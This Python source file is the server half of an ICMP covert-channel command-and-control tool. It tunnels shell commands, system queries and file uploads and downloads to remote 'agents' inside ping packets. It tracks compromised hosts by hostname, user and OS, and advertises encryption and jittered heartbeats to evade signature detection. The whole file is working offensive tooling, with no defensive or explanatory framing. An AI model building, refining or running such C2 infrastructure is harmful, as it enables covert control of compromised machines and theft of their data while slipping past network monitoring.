#!/usr/bin/env python3
"""
icmp_server_v2.py — ICMP C2 Command Server 

Fixes every issue in the original server:

  ✓ Shared protocol library (no code duplication)
  ✓ Binary framing (struct.pack, not fragile colon-delimited strings)
  ✓ Proper chunk reassembly with timeouts
  ✓ Session tracking with automatic dead-peer pruning
  ✓ Quiet heartbeats (summary only, not per-packet spam)
  ✓ File upload/download over ICMP
  ✓ Jittered heartbeat interval (evades signature detection)
  ✓ Thread-safe buffers
  ✓ Structured commands: upload, download, ps, sysinfo, shell, exit
  ✓ Interactive shell with target selection

Usage:
    # Generate a key first
    python -c "from icmp_protocol import Codec; print(Codec.generate_key())"

    # Start the server
    python icmp_server_v2.py -i eth0 --encrypt --key <key>
    python icmp_server_v2.py -i eth0 --compress --encoding base64 --quiet
"""

from __future__ import annotations

import argparse
import os
import random
import readline  # noqa — enables line editing / history in input()
import sys
import threading
import time
from typing import Dict, List, Optional

from scapy.all import IP, ICMP, Raw, send, sniff

from icmp_protocol import (
    DEFAULT_CHUNK_SIZE,
    DEFAULT_ICMP_ID,
    DEFAULT_TTL,
    MAX_CHUNK_SIZE,
    ChunkAssembler,
    Codec,
    FileTransfer,
    MsgType,
    Session,
    SessionManager,
    chunk_file,
    jittered_interval,
    jittered_sleep,
    pack_frame,
    status_err,
    status_ok,
    unpack_frame,
)


 
# Server
 
class ICMPServer:
    """
    ICMP C2 Command Server.

    Listens for agent heartbeats, sends commands, receives responses.
    Supports multi-chunk messages, file transfers, and session tracking.
    """

    def __init__(self, interface: str, icmp_id: int = DEFAULT_ICMP_ID,
                 ttl: int = DEFAULT_TTL, chunk_size: int = DEFAULT_CHUNK_SIZE,
                 codec: Optional[Codec] = None, quiet: bool = False):
        self.interface = interface
        self.icmp_id = icmp_id
        self.ttl = ttl
        self.chunk_size = min(chunk_size, MAX_CHUNK_SIZE)
        self.codec = codec or Codec()
        self.quiet = quiet
        self.running = True
        self.seq = 0

        # Subsystems
        self.sessions = SessionManager()
        self.assembler = ChunkAssembler()
        self.transfers: Dict[str, FileTransfer] = {}
        self.transfer_lock = threading.Lock()

        # Output — protected for thread safety
        self._out_lock = threading.Lock()

    # ---- Output helpers ----
    def _log(self, *args, **kwargs):
        """Thread-safe print to stderr (doesn't interfere with piped data)."""
        with self._out_lock:
            print(*args, **kwargs, file=sys.stderr, flush=True)

    def _info(self, msg: str):
        if not self.quiet:
            self._log(f"[*] {msg}")

    def _ok(self, msg: str):
        self._log(f"[+] {msg}")

    def _err(self, msg: str):
        self._log(f"[-] {msg}")

    # ---- Low-level send ----
    def _send_raw(self, target_ip: str, msg_type: MsgType,
                  payload: bytes):
        """Send a raw framed payload to target, splitting into chunks."""
        framed = pack_frame(msg_type, 0, 1, payload)

        if len(framed) <= self.chunk_size:
            pkt = (IP(dst=target_ip, ttl=self.ttl) /
                   ICMP(type=8, id=self.icmp_id, seq=self.seq) /
                   Raw(load=framed))
            send(pkt, verbose=0)
            self.seq = (self.seq + 1) % 65535
            return

        # Multi-chunk send
        total = (len(framed) + self.chunk_size - 1) // self.chunk_size
        for i in range(total):
            chunk = framed[i * self.chunk_size:(i + 1) * self.chunk_size]
            chunk_framed = pack_frame(msg_type, i, total, chunk)
            pkt = (IP(dst=target_ip, ttl=self.ttl) /
                   ICMP(type=8, id=self.icmp_id, seq=self.seq) /
                   Raw(load=chunk_framed))
            send(pkt, verbose=0)
            self.seq = (self.seq + 1) % 65535
            time.sleep(0.05)

    # ---- High-level send ----
    def send_command(self, target_ip: str, command: bytes):
        """Send a command to a target agent."""
        encoded = self.codec.encode_payload(command)
        self._send_raw(target_ip, MsgType.COMMAND, encoded)

    def send_file(self, target_ip: str, filepath: str):
        """Send a file to a target agent."""
        if not os.path.isfile(filepath):
            self._err(f"File not found: {filepath}")
            return

        fname = os.path.basename(filepath)
        size = os.path.getsize(filepath)
        self._info(f"Sending {fname} ({size:,} bytes) to {target_ip}")

        # Announce file transfer
        meta = f"{fname}|{size}".encode()
        self._send_raw(target_ip, MsgType.FILE_START, self.codec.encode_payload(meta))

        # Send chunks
        chunks = chunk_file(filepath, self.chunk_size - 128)  # leave room for framing
        for i, chunk in enumerate(chunks):
            encoded = self.codec.encode_payload(chunk)
            self._send_raw(target_ip, MsgType.FILE_CHUNK, encoded)
            if i % 50 == 0 and i > 0:
                self._info(f"  Sent {i}/{len(chunks)} chunks ({i * 100 // len(chunks)}%)")
            time.sleep(0.01)

        self._send_raw(target_ip, MsgType.FILE_END, b"")
        self._ok(f"File {fname} sent ({len(chunks)} chunks)")

    # ---- Response handler ----
    def _handle_command(self, command: str, target_ip: str):
        """Handle built-in server-side commands (upload, download, etc.)."""
        parts = command.strip().split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""

        if cmd == "upload":
            if not arg:
                self._err("Usage: upload <local_filepath>")
                return True
            self.send_file(target_ip, arg)
            return True

        if cmd == "help":
            self._log("""
  Built-in commands:
    upload <file>    Send a file to the agent
    shell <cmd>      Execute shell command on agent
    sysinfo          Get system information from agent
    ps               List running processes
    ls <path>        List directory contents
    cat <file>       Read file contents from agent
    download <file>  Request file download from agent
    exit             Disconnect agent
    help             Show this help
""")
            return True

        return False  # not a built-in, send as shell command

    # ---- Packet processor ----
    def _process_packet(self, pkt):
        """Scapy callback — runs in sniffer thread."""
        try:
            if not (pkt.haslayer(IP) and pkt.haslayer(ICMP) and pkt.haslayer(Raw)):
                return
            if pkt[ICMP].id != self.icmp_id:
                return

            src_ip = pkt[IP].src
            raw = bytes(pkt[Raw].load)

            # Try to unpack binary frame — fall back to legacy parsing
            msg_type: MsgType = MsgType.RESPONSE
            chunk_idx: int = 0
            total: int = 1
            payload: bytes = raw

            try:
                msg_type, chunk_idx, total, payload = unpack_frame(raw)
            except ValueError:
                # Legacy: might be old-format packet (HEARTBEAT text, etc.)
                text = raw.decode("utf-8", errors="ignore")
                if text.startswith("HEARTBEAT"):
                    self._handle_heartbeat(src_ip, text)
                    return
                # Treat as raw response
                payload = raw

            if total > 1:
                full = self.assembler.feed(src_ip, chunk_idx, total, payload)
                if full is None:
                    return  # waiting for more chunks
                payload = full
                self.assembler.clear(src_ip)

            if msg_type == MsgType.HEARTBEAT:
                self._handle_heartbeat_v2(src_ip, payload)

            elif msg_type == MsgType.RESPONSE:
                self._handle_response(src_ip, payload)

            elif msg_type == MsgType.FILE_START:
                self._handle_file_start(src_ip, payload)

            elif msg_type == MsgType.FILE_CHUNK:
                self._handle_file_chunk(src_ip, payload)

            elif msg_type == MsgType.FILE_END:
                self._handle_file_end(src_ip, payload)

            elif msg_type == MsgType.ERROR:
                text = self.codec.decode_payload(payload).decode("utf-8", errors="replace")
                self._err(f"Agent {src_ip} error: {text}")

        except Exception as e:
            self._err(f"Packet processing error: {e}")

    # ---- Legacy heartbeat handler ----
    def _handle_heartbeat(self, src_ip: str, text: str):
        """Handle old-format heartbeat messages."""
        sess = self.sessions.heartbeat(src_ip)
        if not self.quiet:
            self._info(f"Heartbeat from {src_ip} (session: {sess.session_id})")

    # ---- V2 protocol handlers ----
    def _handle_heartbeat_v2(self, src_ip: str, payload: bytes):
        """Handle framed heartbeat with optional info."""
        try:
            info = self.codec.decode_payload(payload).decode("utf-8", errors="replace")
            # Parse info: hostname|user|os
            parts = info.split("|")
            kwargs = {}
            if len(parts) >= 1 and parts[0]:
                kwargs["hostname"] = parts[0]
            if len(parts) >= 2:
                kwargs["user"] = parts[1]
            if len(parts) >= 3:
                kwargs["os"] = parts[2]

            sess = self.sessions.heartbeat(src_ip, **kwargs)
            if not self.quiet:
                self._info(f"♥ {src_ip} ({sess.hostname}) [{sess.session_id}]")
        except Exception:
            self.sessions.heartbeat(src_ip)

    def _handle_response(self, src_ip: str, payload: bytes):
        """Handle command response from agent."""
        try:
            text = self.codec.decode_payload(payload).decode("utf-8", errors="replace")
            # Print directly to stdout so it shows inline with shell
            with self._out_lock:
                print(text, end="", flush=True)
        except Exception as e:
            self._err(f"Response decode error: {e}")

    def _handle_file_start(self, src_ip: str, payload: bytes):
        """Agent is starting a file transfer to us."""
        try:
            meta = self.codec.decode_payload(payload).decode("utf-8", errors="replace")
            fname, size_str = meta.split("|", 1)
            size = int(size_str)
            tid = f"{src_ip}:{fname}:{int(time.time())}"

            with self.transfer_lock:
                self.transfers[tid] = FileTransfer(
                    transfer_id=tid, filename=fname, total_size=size
                )

            self._info(f"Incoming file: {fname} ({size:,} bytes) from {src_ip}")
        except Exception as e:
            self._err(f"File start error: {e}")

    def _handle_file_chunk(self, src_ip: str, payload: bytes):
        """Receive a file chunk from agent."""
        try:
            data = self.codec.decode_payload(payload)
            with self.transfer_lock:
                # Find the active transfer for this IP
                active = None
                for tid, t in self.transfers.items():
                    if tid.startswith(src_ip) and not t.complete:
                        active = t
                        break

                if active is None:
                    self._err(f"No active transfer for {src_ip}")
                    return

                with active.lock:
                    active.received += len(data)

                # Append to output file
                outdir = "downloads"
                os.makedirs(outdir, exist_ok=True)
                outpath = os.path.join(outdir, active.filename)
                with open(outpath, "ab") as f:
                    f.write(data)

        except Exception as e:
            self._err(f"File chunk error: {e}")

    def _handle_file_end(self, src_ip: str, payload: bytes):
        """File transfer complete."""
        with self.transfer_lock:
            active = None
            for tid, t in list(self.transfers.items()):
                if tid.startswith(src_ip):
                    active = t
                    del self.transfers[tid]
                    break

        if active:
            outdir = "downloads"
            outpath = os.path.join(outdir, active.filename)
            self._ok(f"Downloaded {active.filename} ({active.received:,} bytes) → {outpath}")

    # ---- Start ----
    def start(self):
        """Start the server — sniffing thread + interactive shell."""
        self._log("  ╔══════════════════════════════════════════════╗")
        self._log("  ║    ICMP C2 SERVER v2                         ║")
        self._log("  ╚══════════════════════════════════════════════╝")
        self._log(f"  Interface:  {self.interface}")
        self._log(f"  ICMP ID:    {self.icmp_id} (0x{self.icmp_id:04X})")
        self._log(f"  Chunk size: {self.chunk_size}B")
        self._log(f"  Encryption: {'ON' if self.codec.encrypt else 'OFF'}")
        self._log(f"  Encoding:   {self.codec.encoding}")
        self._log(f"  Compression:{'ON' if self.codec.compress else 'OFF'}")

        # Start sniffer
        sniffer = threading.Thread(target=self._sniff_loop, daemon=True)
        sniffer.start()

        self._log("\n  Waiting for agents... (Ctrl+C to stop)\n")

        # Interactive shell
        try:
            while self.running:
                try:
                    alive = self.sessions.list_alive()

                    # Build prompt
                    if not alive:
                        prompt = "c2> "
                    elif len(alive) == 1:
                        prompt = f"c2 [{alive[0].hostname}]> "
                    else:
                        prompt = f"c2 [{len(alive)} agents]> "

                    cmd = input(prompt).strip()
                    if not cmd:
                        continue

                    # Built-in server commands
                    if cmd.lower() in ("exit", "quit"):
                        break
                    if cmd.lower() == "sessions":
                        self._show_sessions(alive)
                        continue
                    if cmd.lower() == "target":
                        self._select_target(alive)
                        continue

                    # If we have a preselected target, send to it
                    active = alive[0] if len(alive) == 1 else None
                    if hasattr(self, "_target") and self._target:
                        active = self._target

                    if active is None and alive:
                        self._err("Multiple agents connected. Use 'target' to select one.")
                        self._show_sessions(alive)
                        continue

                    if active is None:
                        self._err("No agents connected.")
                        continue

                    # Check if it's a built-in command
                    if self._handle_command(cmd, active.ip):
                        continue

                    # Send as shell command
                    self.send_command(active.ip, cmd.encode("utf-8"))

                except KeyboardInterrupt:
                    break
                except EOFError:
                    break

        finally:
            self.running = False
            self._log("\n[*] Server stopped.")

    def _sniff_loop(self):
        """Background thread: sniff ICMP packets."""
        try:
            sniff(iface=self.interface, prn=self._process_packet,
                  filter="icmp", store=0,
                  stop_filter=lambda _: not self.running)
        except Exception as e:
            self._err(f"Sniffer error: {e}")

    def _show_sessions(self, sessions: List[Session]):
        """Display connected agents."""
        if not sessions:
            self._log("  No agents connected.")
            return
        self._log(f"\n  {'IP':<16} {'Hostname':<16} {'User':<12} {'OS':<12} {'Uptime':<10} Session ID")
        self._log(f"  {'─'*16} {'─'*16} {'─'*12} {'─'*12} {'─'*10} {'─'*12}")
        for s in sessions:
            uptime_str = f"{int(s.uptime)}s"
            self._log(f"  {s.ip:<16} {s.hostname:<16} {s.user:<12} {s.os:<12} {uptime_str:<10} {s.session_id}")

    def _select_target(self, sessions: List[Session]):
        """Interactively select a target from the session list."""
        self._show_sessions(sessions)
        if not sessions:
            return
        try:
            idx = input("  Select agent #: ").strip()
            idx = int(idx) - 1
            if 0 <= idx < len(sessions):
                self._target = sessions[idx]
                self._ok(f"Target set to {sessions[idx].hostname} ({sessions[idx].ip})")
            else:
                self._err("Invalid selection.")
        except (ValueError, IndexError):
            self._err("Invalid input.")



# CLI
 
def main():
    parser = argparse.ArgumentParser(
        description="ICMP C2 Command Server v2",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python icmp_server_v2.py -i eth0
  python icmp_server_v2.py -i eth0 --encrypt --key $(python -c "from icmp_protocol import Codec; print(Codec.generate_key())")
  python icmp_server_v2.py -i eth0 --compress --encoding base64 --quiet
        """
    )
    parser.add_argument("-i", "--interface", required=True,
                        help="Network interface to listen on")
    parser.add_argument("--icmp-id", type=int, default=DEFAULT_ICMP_ID,
                        help=f"ICMP ID (default: {DEFAULT_ICMP_ID})")
    parser.add_argument("--ttl", type=int, default=DEFAULT_TTL,
                        help=f"IP TTL (default: {DEFAULT_TTL})")
    parser.add_argument("--chunk-size", type=int, default=DEFAULT_CHUNK_SIZE,
                        help=f"Max chunk size in bytes (default: {DEFAULT_CHUNK_SIZE})")
    parser.add_argument("--encoding", choices=["plain", "base64", "hex"],
                        default="plain", help="Data encoding method")
    parser.add_argument("--compress", action="store_true",
                        help="Enable zlib compression")
    parser.add_argument("--encrypt", action="store_true",
                        help="Enable Fernet encryption")
    parser.add_argument("--key", type=str,
                        help="Fernet encryption key (required with --encrypt)")
    parser.add_argument("-q", "--quiet", action="store_true",
                        help="Suppress heartbeat and info messages")

    args = parser.parse_args()

    if args.encrypt and not args.key:
        parser.error("--encrypt requires --key")

    codec = Codec(
        encoding=args.encoding,
        compress=args.compress,
        encrypt=args.encrypt,
        key=args.key,
    )

    server = ICMPServer(
        interface=args.interface,
        icmp_id=args.icmp_id,
        ttl=args.ttl,
        chunk_size=args.chunk_size,
        codec=codec,
        quiet=args.quiet,
    )
    server.start()


if __name__ == "__main__":
    main()
